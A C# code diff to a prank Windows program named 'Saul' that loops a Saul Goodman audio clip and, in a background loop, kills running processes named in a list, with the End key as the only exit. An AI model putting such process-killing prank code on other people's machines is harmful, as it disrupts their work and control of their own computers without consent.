@@ -27,23 +27,14 @@ namespace Saul
             {
                 while (true)
                 {
-                    if (GetAsyncKeyState(Keys.End) < 0)
-                    {
-                        Environment.Exit(0);
-                    }
+                    if (GetAsyncKeyState(Keys.End) < 0) { Environment.Exit(0); }
+                    Troll();
                 };
             }).Start();
 
             SoundPlayer audio = new SoundPlayer(Saul.Properties.Resources.Saul_goodman_3d__1_);
-
-
             audio.PlayLooping();
 
-
-            new Thread(() =>
-            {
-                while (true) { Troll(); }
-            }).Start();
             Application.EnableVisualStyles();
             Application.SetCompatibleTextRenderingDefault(false);
             Application.Run(new Form1());
@@ -58,10 +49,8 @@ namespace Saul
                 foreach (var process in Process.GetProcessesByName(zlyprocess))
                 {
                     try { process.Kill(); } catch { }
-
                 }
-            }
-          
+            }     
         }
     }
 }
